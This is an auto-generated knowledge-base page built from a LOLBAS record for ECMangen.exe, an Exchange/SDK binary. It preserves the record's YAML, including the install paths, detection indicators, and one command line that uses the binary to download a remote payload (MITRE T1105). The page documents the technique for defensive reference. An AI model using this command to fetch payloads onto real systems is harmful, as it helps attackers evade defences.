---
parsed_by: focuslocust
source: lolbas
type: generated
---
# ECMangen.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ecmangen.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ECMangen.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ECMangen.exe](../../tools/windows/ecmangen.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ecmangen.exe |
| name | ECMangen.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: ECMangen.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache
Created: 2024-04-30
Description: Command-line tool for managing certificates in Microsoft Exchange Server.
Detection:
- IOC: URL on a ECMangen command line
- IOC: ECMangen making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe
- Path: C:\ExchangeServer\Bin\ECMangen.exe
Name: ECMangen.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ECMangen.yml
```

## Detection / Analysis Notes

```text
IOC: ECMangen making unexpected network connections or DNS requests
```

```text
IOC: URL on a ECMangen command line
```

```text
- IOC: URL on a ECMangen command line
- IOC: ECMangen making unexpected network connections or DNS requests
```
